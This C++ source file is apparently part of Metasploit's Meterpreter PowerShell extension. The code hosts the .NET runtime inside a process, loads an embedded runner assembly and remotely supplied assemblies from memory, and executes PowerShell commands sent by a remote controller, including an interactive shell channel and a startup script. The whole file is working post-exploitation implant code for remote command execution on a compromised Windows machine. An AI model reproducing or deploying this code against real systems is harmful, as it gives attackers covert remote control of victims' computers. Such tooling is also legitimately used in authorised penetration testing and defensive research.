/*!
 * @file powershell_bridge.cpp
 * @brief Wrapper functions for bridging native meterp calls to powershell
 */
extern "C" {
#include "../../common/common.h"
#include "powershell.h"
#include "powershell_bridge.h"
#include "powershell_bindings.h"
}

#include <comdef.h>
#include <mscoree.h>
#include <metahost.h>

#include "powershell_runner.h"

typedef struct _InteractiveShell
{
	HANDLE wait_handle;
	_bstr_t output;
	wchar_t* session_id;
} InteractiveShell;

#define SAFE_RELEASE(x) if((x) != NULL) { (x)->Release(); x = NULL; }

#import "mscorlib.tlb" raw_interfaces_only				\
    high_property_prefixes("_get","_put","_putref")		\
    rename("ReportEvent", "InteropServices_ReportEvent")
using namespace mscorlib;

typedef HRESULT(WINAPI* pClrCreateInstance)(REFCLSID, REFIID, LPVOID*);
typedef HRESULT(WINAPI* pCorBindToRuntime)(LPCWSTR, LPCWSTR, REFCLSID, REFIID, LPVOID*);

static ICLRMetaHost* gClrMetaHost = NULL;
static ICLRRuntimeInfo* gClrRuntimeInfo = NULL;
static ICorRuntimeHost* gClrCorRuntimeHost = NULL;
static IUnknownPtr gClrAppDomain = NULL;
static _AppDomainPtr gClrAppDomainInterface = NULL;
static _AssemblyPtr gClrPowershellAssembly = NULL;
static _TypePtr gClrPowershellType = NULL;
static LIST* gLoadedAssemblies = NULL;

DWORD load_assembly(BYTE* assemblyData, DWORD assemblySize)
{
	dprintf("[PSH] loading assembly of size %u", assemblySize);
	HRESULT hr = S_OK;
	SAFEARRAY* clrByteArray = NULL;
	SAFEARRAYBOUND bounds[1];
	_AssemblyPtr* loadedAssembly = new _AssemblyPtr();

	bounds[0].cElements = assemblySize;
	bounds[0].lLbound = 0;

	if (gClrAppDomainInterface == NULL)
	{
		dprintf("[PSH] Extension wasn't initialised");
		return ERROR_INVALID_HANDLE;
	}

	do
	{
		clrByteArray = SafeArrayCreate(VT_UI1, 1, bounds);
		if (clrByteArray == NULL)
		{
			dprintf("[PSH] Failed to create a usable safe array");
			hr = (HRESULT)ERROR_OUTOFMEMORY;
			break;
		}

		dprintf("[PSH] Safe array created");
		if (FAILED(hr = SafeArrayLock(clrByteArray)))
		{
			dprintf("[PSH] Safe array lock failed 0x%x", hr);
			break;
		}

		dprintf("[PSH] Copying binary data to target");
		memcpy(clrByteArray->pvData, assemblyData, assemblySize);
		SafeArrayUnlock(clrByteArray);

		if (FAILED(hr = gClrAppDomainInterface->Load_3(clrByteArray, (_Assembly**)loadedAssembly)))
		{
			dprintf("[PSH] Failed to load the assembly 0x%x", hr);
			break;
		}

		dprintf("[PSH] Assembly appears to have been loaded successfully");
		list_add(gLoadedAssemblies, loadedAssembly);
	} while (0);

	if (SUCCEEDED(hr))
	{
		return ERROR_SUCCESS;
	}
	else
	{
		delete loadedAssembly;
	}
	return (DWORD)hr;
}

DWORD remove_session(wchar_t* sessionId)
{
	HRESULT hr;
	bstr_t bstrStaticMethodName(L"Remove");
	SAFEARRAY *psaStaticMethodArgs = NULL;
	variant_t vtSessionArg(sessionId == NULL ? L"Default" : sessionId);
	variant_t vtPSInvokeReturnVal;
	variant_t vtEmpty;
	LONG index = 0;

	psaStaticMethodArgs = SafeArrayCreateVector(VT_VARIANT, 0, 1);
	do
	{
		hr = SafeArrayPutElement(psaStaticMethodArgs, &index, &vtSessionArg);
		if (FAILED(hr))
		{
			dprintf("[PSH] failed to prepare session argument: 0x%x", hr);
			break;
		}

		// Invoke the method from the Type interface.
		hr = gClrPowershellType->InvokeMember_3(
			bstrStaticMethodName,
			static_cast<BindingFlags>(BindingFlags_InvokeMethod | BindingFlags_Static | BindingFlags_Public),
			NULL,
			vtEmpty,
			psaStaticMethodArgs,
			&vtPSInvokeReturnVal);

		if (FAILED(hr))
		{
			dprintf("[PSH] failed to invoke powershell function 0x%x", hr);
			break;
		}
	} while (0);

	if (psaStaticMethodArgs != NULL)
	{
		SafeArrayDestroy(psaStaticMethodArgs);
	}

	if (SUCCEEDED(hr))
	{
		return ERROR_SUCCESS;
	}

	return (DWORD)hr;
}

DWORD invoke_ps_command(wchar_t* sessionId, wchar_t* command, _bstr_t& output)
{
	HRESULT hr;
	bstr_t bstrStaticMethodName(L"Execute");
	SAFEARRAY *psaStaticMethodArgs = NULL;
	variant_t vtSessionArg(sessionId == NULL ? L"Default" : sessionId);
	variant_t vtPSInvokeReturnVal;
	variant_t vtEmpty;
	variant_t vtCommandArg(command);
	LONG index = 0;

	if (gClrPowershellType == NULL)
	{
		return ERROR_INVALID_HANDLE;
	}

	psaStaticMethodArgs = SafeArrayCreateVector(VT_VARIANT, 0, 2);
	do
	{
		hr = SafeArrayPutElement(psaStaticMethodArgs, &index, &vtSessionArg);
		if (FAILED(hr))
		{
			dprintf("[PSH] failed to prepare session argument: 0x%x", hr);
			break;
		}

		index++;
		hr = SafeArrayPutElement(psaStaticMethodArgs, &index, &vtCommandArg);
		if (FAILED(hr))
		{
			dprintf("[PSH] failed to prepare command argument: 0x%x", hr);
			break;
		}

		// Invoke the method from the Type interface.
		hr = gClrPowershellType->InvokeMember_3(
			bstrStaticMethodName,
			static_cast<BindingFlags>(BindingFlags_InvokeMethod | BindingFlags_Static | BindingFlags_Public),
			NULL,
			vtEmpty,
			psaStaticMethodArgs,
			&vtPSInvokeReturnVal);

		if (FAILED(hr))
		{
			dprintf("[PSH] failed to invoke powershell function 0x%x", hr);
			break;
		}
		output = vtPSInvokeReturnVal.bstrVal;
	} while (0);

	if (psaStaticMethodArgs != NULL)
	{
		SafeArrayDestroy(psaStaticMethodArgs);
	}

	if (SUCCEEDED(hr))
	{
		return ERROR_SUCCESS;
	}

	return (DWORD)hr;
}

DWORD initialize_dotnet_host()
{
	HRESULT hr = S_OK;
	ICLRMetaHost* clrMetaHost = NULL;
	ICLRRuntimeInfo* clrRuntimeInfo = NULL;
	ICorRuntimeHost* clrCorRuntimeHost = NULL;
	IUnknownPtr clrAppDomain = NULL;
	_AppDomainPtr clrAppDomainInterface = NULL;
	_AssemblyPtr clrPowershellAssembly = NULL;
	_TypePtr clrPowershellType = NULL;
	SAFEARRAY* clrByteArray = NULL;
	HMODULE hMsCoree = NULL;

	do
	{
		dprintf("[PSH] Locating CLR instance ...");
		hMsCoree = LoadLibraryA("mscoree.dll");
		if (hMsCoree == NULL)
		{
			hr = (HRESULT)GetLastError();
			dprintf("[PSH] Failed to load mscoree, .NET probably isn't installed. 0x%x", hr);
			break;
		}

		pClrCreateInstance clrCreateInstance = (pClrCreateInstance)GetProcAddress(hMsCoree, "CLRCreateInstance");
		if (clrCreateInstance != NULL)
		{
			dprintf("[PSH] .NET 4 method in use");

			if (FAILED(hr = clrCreateInstance(CLSID_CLRMetaHost, IID_PPV_ARGS(&clrMetaHost))))
			{
				dprintf("[PSH] Failed to create instace of the CLR metahost 0x%x", hr);
				break;
			}

			dprintf("[PSH] Getting a reference to the .NET runtime");
			if (FAILED(hr = clrMetaHost->GetRuntime(L"v2.0.50727", IID_PPV_ARGS(&clrRuntimeInfo))))
			{
				dprintf("[PSH] Failed to get runtime v2.0.50727 instance 0x%x", hr);
				if (FAILED(hr = clrMetaHost->GetRuntime(L"v4.0.30319", IID_PPV_ARGS(&clrRuntimeInfo))))
				{
					dprintf("[PSH] Failed to get runtime v4.0.30319 instance 0x%x", hr);
					break;
				}
			}

			dprintf("[PSH] Determining loadablility");
			BOOL loadable = FALSE;
			if (FAILED(hr = clrRuntimeInfo->IsLoadable(&loadable)))
			{
				dprintf("[PSH] Unable to determine of runtime is loadable 0x%x", hr);
				break;
			}

			if (!loadable)
			{
				dprintf("[PSH] Chosen runtime isn't loadable, exiting.");
				break;
			}

			dprintf("[PSH] Instantiating the COR runtime host");
			hr = clrRuntimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_PPV_ARGS(&clrCorRuntimeHost));
			if (FAILED(hr))
			{
				dprintf("[PSH] Unable to get a reference to the COR runtime host 0x%x", hr);
				break;
			}
		}
		else
		{
			dprintf("[PSH] .NET 4 method is missing, attempting to locate .NEt 2 method");
			pCorBindToRuntime corBindToRuntime = (pCorBindToRuntime)GetProcAddress(hMsCoree, "CorBindToRuntime");
			if (corBindToRuntime == NULL)
			{
				dprintf("[PSH] Unable to find .NET clr instance loader");
				hr = E_NOTIMPL;
				break;
			}

			if (FAILED(hr = corBindToRuntime(L"v2.0.50727", L"wks", CLSID_CorRuntimeHost, IID_PPV_ARGS(&clrCorRuntimeHost))))
			{
				dprintf("[PSH] Unable to bind to .NET 2 runtime host: 0x%x", hr);
				break;
			}
		}

		dprintf("[PSH] Starting the COR runtime host");
		if (FAILED(hr = clrCorRuntimeHost->Start()))
		{
			dprintf("[PSH] Unable to start the COR runtime host 0x%x", hr);
			break;
		}

		dprintf("[PSH] Getting a ref to the app domain");
		if (FAILED(hr = clrCorRuntimeHost->GetDefaultDomain(&clrAppDomain)))
		{
			dprintf("[PSH] Unable to get the app domain 0x%x", hr);
			break;
		}

		dprintf("[PSH] Getting a ref to the app domain interface");
		if (FAILED(hr = clrAppDomain->QueryInterface(IID_PPV_ARGS(&clrAppDomainInterface))))
		{
			dprintf("[PSH] Unable to get the app domain interface 0x%x", hr);
			break;
		}

		dprintf("[PSH] CLR app domain ready to run, now loading the powershell runner");
		SAFEARRAYBOUND bounds[1];
		bounds[0].cElements = PSHRUNNER_DLL_LEN;
		bounds[0].lLbound = 0;

		clrByteArray = SafeArrayCreate(VT_UI1, 1, bounds);
		if (clrByteArray == NULL)
		{
			dprintf("[PSH] Failed to create a usable safe array");
			hr = ERROR_OUTOFMEMORY;
			break;
		}

		if (FAILED(hr = SafeArrayLock(clrByteArray)))
		{
			dprintf("[PSH] Safe array lock failed 0x%x", hr);
			break;
		}
		memcpy(clrByteArray->pvData, PowerShellRunnerDll, PSHRUNNER_DLL_LEN);
		SafeArrayUnlock(clrByteArray);

		if (FAILED(hr = clrAppDomainInterface->Load_3(clrByteArray, &clrPowershellAssembly)))
		{
			dprintf("[PSH] Failed to load the powershell runner assembly 0x%x", hr);
			break;
		}

		dprintf("[PSH] Loading the type from memory");
		_bstr_t pshClassName("MSF.Powershell.Runner");
		if (FAILED(hr = clrPowershellAssembly->GetType_2(pshClassName, &clrPowershellType)))
		{
			dprintf("[PSH] Unable to locate the powershell class type 0x%x", hr);
			break;
		}

		gLoadedAssemblies = list_create();
		dprintf("[PSH] Runtime has been initialized successfully");

	} while(0);

	if (clrByteArray != NULL)
	{
		SafeArrayDestroy(clrByteArray);
	}

	if (FAILED(hr))
	{
		SAFE_RELEASE(clrPowershellAssembly);
		SAFE_RELEASE(clrAppDomainInterface);
		SAFE_RELEASE(clrCorRuntimeHost);
		SAFE_RELEASE(clrRuntimeInfo);
		SAFE_RELEASE(clrMetaHost);
		return (DWORD)hr;
	}

	gClrMetaHost = clrMetaHost;
	gClrRuntimeInfo = clrRuntimeInfo;
	gClrCorRuntimeHost = clrCorRuntimeHost;
	gClrAppDomainInterface = clrAppDomainInterface;
	gClrAppDomain = clrAppDomain;
	gClrPowershellAssembly = clrPowershellAssembly;
	gClrPowershellType = clrPowershellType;

	wchar_t callbackCmd[256];
	swprintf_s(callbackCmd, 255, L"[MSF.Powershell.Meterpreter.Core]::SetInvocationPointer(0x%p)", MeterpreterInvoke);
	_bstr_t output;
	dprintf("[PSH] Setting the binding callback pointer:  %S", callbackCmd);
	invoke_ps_command(NULL, callbackCmd, output);

	return ERROR_SUCCESS;
}

BOOL destroy_loaded_assembly(LPVOID state, LPVOID data)
{
	if (data != NULL)
	{
		((_AssemblyPtr*)data)->Release();
	}
	return TRUE;
}

VOID deinitialize_dotnet_host()
{
	dprintf("[PSH] Cleaning up the .NET/PSH runtime.");

	SAFE_RELEASE(gClrPowershellType);

	list_enumerate(gLoadedAssemblies, destroy_loaded_assembly, NULL);
	list_destroy(gLoadedAssemblies);

	SAFE_RELEASE(gClrPowershellAssembly);
	SAFE_RELEASE(gClrAppDomainInterface);
	SAFE_RELEASE(gClrCorRuntimeHost);
	SAFE_RELEASE(gClrRuntimeInfo);
	SAFE_RELEASE(gClrMetaHost);
}

DWORD powershell_channel_interact_notify(Remote *remote, LPVOID entryContext, LPVOID threadContext)
{
	Channel *channel = (Channel*)entryContext;
	InteractiveShell* shell = (InteractiveShell*)threadContext;
	DWORD byteCount = shell->output.length() + 1;

	if (shell->output.length() > 1 && shell->wait_handle != NULL)
	{
		DWORD result = channel_write(channel, remote, NULL, 0, (PUCHAR)(char*)shell->output, byteCount, NULL);
		shell->output = "";
		ResetEvent(shell->wait_handle);
	}

	return ERROR_SUCCESS;
}

DWORD powershell_channel_interact_destroy(HANDLE waitable, LPVOID entryContext, LPVOID threadContext)
{
	dprintf("[PSH SHELL] finalising interaction");
	InteractiveShell* shell = (InteractiveShell*)threadContext;
	if (shell->wait_handle)
	{
		HANDLE h = shell->wait_handle;
		shell->wait_handle = NULL;
		CloseHandle(h);
	}
	return ERROR_SUCCESS;
}

DWORD powershell_channel_interact(Channel *channel, Packet *request, LPVOID context, BOOLEAN interact)
{
	DWORD result = ERROR_SUCCESS;
	InteractiveShell* shell = (InteractiveShell*)context;
	if (interact)
	{
		if (shell->wait_handle == NULL)
		{
			dprintf("[PSH SHELL] beginning interaction");
			shell->wait_handle = CreateEventA(NULL, FALSE, FALSE, NULL);

			result = scheduler_insert_waitable(shell->wait_handle, channel, context,
				powershell_channel_interact_notify, powershell_channel_interact_destroy);

			SetEvent(shell->wait_handle);
		}
	}
	else if (shell->wait_handle != NULL)
	{
		dprintf("[PSH SHELL] stopping interaction");
		result = scheduler_signal_waitable(shell->wait_handle, Stop);
	}

	return result;
}

DWORD powershell_channel_write(Channel* channel, Packet* request, LPVOID context,
	LPVOID buffer, DWORD bufferSize, LPDWORD bytesWritten)
{
	InteractiveShell* shell = (InteractiveShell*)context;

	_bstr_t codeMarshall((char*)buffer);
	dprintf("[PSH SHELL] executing command: %s", (char*)codeMarshall);

	_bstr_t output;

	DWORD result = invoke_ps_command(shell->session_id, codeMarshall, output);
	if (result == ERROR_SUCCESS && shell->wait_handle)
	{
		shell->output += output + "PS > ";
		SetEvent(shell->wait_handle);
	}
	return result;
}

DWORD powershell_channel_close(Channel* channel, Packet* request, LPVOID context)
{
	dprintf("[PSH SHELL] closing channel");
	InteractiveShell* shell = (InteractiveShell*)context;

	if (shell != NULL)
	{
		if (shell->wait_handle != NULL)
		{
			HANDLE h = shell->wait_handle;
			shell->wait_handle = NULL;
			CloseHandle(h);
		}

		SAFE_FREE(shell->session_id);
		SAFE_FREE(shell);
	}

	return ERROR_SUCCESS;
}

/*!
 * @brief Start an interactive powershell session.
 * @param remote Pointer to the \c Remote making the request.
 * @param packet Pointer to the request \c Packet.
 * @returns Indication of success or failure.
 */
DWORD request_powershell_shell(Remote *remote, Packet *packet)
{
	DWORD dwResult = ERROR_SUCCESS;
	Packet* response = packet_create_response(packet);
	InteractiveShell* shell = NULL;

	if (response)
	{
		do
		{
			PoolChannelOps chanOps = { 0 };
			shell = (InteractiveShell*)calloc(1, sizeof(InteractiveShell));

			if (shell == NULL)
			{
				dprintf("[PSH] Failed to allocated memory");
				dwResult = ERROR_OUTOFMEMORY;
				break;
			}
			shell->session_id = packet_get_tlv_value_wstring(packet, TLV_TYPE_POWERSHELL_SESSIONID);

			if (shell->session_id != NULL)
			{
				dprintf("[PSH] Session ID set to %S", shell->session_id);
			}
			else
			{
				dprintf("[PSH] Session ID not set");
			}

			chanOps.native.context = shell;
			chanOps.native.close = powershell_channel_close;
			chanOps.native.write = powershell_channel_write;
			chanOps.native.interact = powershell_channel_interact;
			shell->output = "PS > ";
			Channel* newChannel = channel_create_pool(0, CHANNEL_FLAG_SYNCHRONOUS, &chanOps);

			channel_set_type(newChannel, "psh");
			packet_add_tlv_uint(response, TLV_TYPE_CHANNEL_ID, channel_get_id(newChannel));
		} while (0);

		packet_transmit_response(dwResult, remote, response);
	}

	if (dwResult != ERROR_SUCCESS)
	{
		SAFE_FREE(shell);
	}

	return dwResult;
}

/*!
 * @brief Handle the request for powershell execution.
 * @param remote Pointer to the \c Remote making the request.
 * @param packet Pointer to the request \c Packet.
 * @returns Indication of success or failure.
 */
DWORD request_powershell_execute(Remote *remote, Packet *packet)
{
	DWORD dwResult = ERROR_SUCCESS;
	Packet* response = packet_create_response(packet);
	wchar_t* sessionId = NULL;

	if (response)
	{
		char* code = packet_get_tlv_value_string(packet, TLV_TYPE_POWERSHELL_CODE);
		if (code != NULL)
		{
			_bstr_t codeMarshall(code);
			_bstr_t output;

			sessionId = packet_get_tlv_value_wstring(packet, TLV_TYPE_POWERSHELL_SESSIONID);

			dwResult = invoke_ps_command(sessionId, codeMarshall, output);
			if (dwResult == ERROR_SUCCESS)
			{
				packet_add_tlv_string(response, TLV_TYPE_POWERSHELL_RESULT, output);
			}
		}
		else
		{
			dprintf("[PSH] Code parameter missing from call");
			dwResult = ERROR_INVALID_PARAMETER;
		}
		packet_transmit_response(dwResult, remote, response);
	}

	SAFE_FREE(sessionId);

	return dwResult;
}

/*!
 * @brief Handle the request for .NET assembly importing/loading.
 * @param remote Pointer to the \c Remote making the request.
 * @param packet Pointer to the request \c Packet.
 * @returns Indication of success or failure.
 */
DWORD request_powershell_assembly_load(Remote *remote, Packet *packet)
{
	DWORD dwResult = ERROR_SUCCESS;
	Packet* response = packet_create_response(packet);
	wchar_t* sessionId = NULL;

	if (response)
	{
		BYTE* binary = packet_get_tlv_value_raw(packet, TLV_TYPE_POWERSHELL_ASSEMBLY);
		if (binary != NULL)
		{
			DWORD binarySize = packet_get_tlv_value_uint(packet, TLV_TYPE_POWERSHELL_ASSEMBLY_SIZE);
			dwResult = load_assembly(binary, binarySize);
		}
		else
		{
			dprintf("[PSH] Assembly parameter missing from call");
			dwResult = ERROR_INVALID_PARAMETER;
		}
		packet_transmit_response(dwResult, remote, response);
	}

	SAFE_FREE(sessionId);

	return dwResult;
}

/*!
 * @brief Handle the removal of a session from the interpreter.
 * @param remote Pointer to the \c Remote making the request.
 * @param packet Pointer to the request \c Packet.
 * @returns Indication of success or failure.
 */
DWORD request_powershell_session_remove(Remote *remote, Packet *packet)
{
	DWORD dwResult = ERROR_SUCCESS;
	Packet* response = packet_create_response(packet);
	wchar_t* sessionId = NULL;

	if (response)
	{
		sessionId = packet_get_tlv_value_wstring(packet, TLV_TYPE_POWERSHELL_SESSIONID);

		dwResult = remove_session(sessionId);

		packet_transmit_response(dwResult, remote, response);
	}

	SAFE_FREE(sessionId);

	return dwResult;
}

DWORD invoke_startup_script(LPCSTR script)
{
	if (script == NULL)
	{
		return ERROR_SUCCESS;
	}

	size_t size;
	DWORD result = (DWORD)mbstowcs_s(&size, NULL, 0, script, 0);

	if (result != ERROR_SUCCESS)
	{
		return result;
	}

	size++;
	wchar_t* wideString = (wchar_t*)calloc(size, sizeof(wchar_t));

	if (wideString)
	{
		_bstr_t output;
		mbstowcs_s(&size, wideString, size + 1, script, size);

		// ignore the output, we don't care about it during startup
		dprintf("[PSH] calling invoke of powershell script: %S", wideString);
		result = invoke_ps_command(NULL, wideString, output);
		dprintf("[PSH] output of init powershell script is: %S", (wchar_t*)output);
		free(wideString);
	}

	return result;
}